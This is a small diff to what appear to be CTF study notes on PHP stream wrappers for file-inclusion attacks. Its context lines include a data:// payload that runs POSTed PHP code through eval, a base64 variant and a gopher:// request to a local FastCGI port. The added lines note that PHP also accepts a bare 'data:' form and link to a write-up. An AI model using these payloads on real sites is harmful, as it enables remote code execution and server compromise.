@@ -52,6 +52,8 @@
 		- `data://text/plain,<?php eval($_POST['data']);?>`
 	- base64
 		- `data://text/plain;base64,`
+	- php中也可以是`data:xxx`
+		- [[CTF/WP/Phuck2]]
 - # `gopher://`
   id:: 62f27746-a352-41d4-b76d-63fc1f7c9e4f
 	- `gopher://127.0.0.1:9000/_xxx`
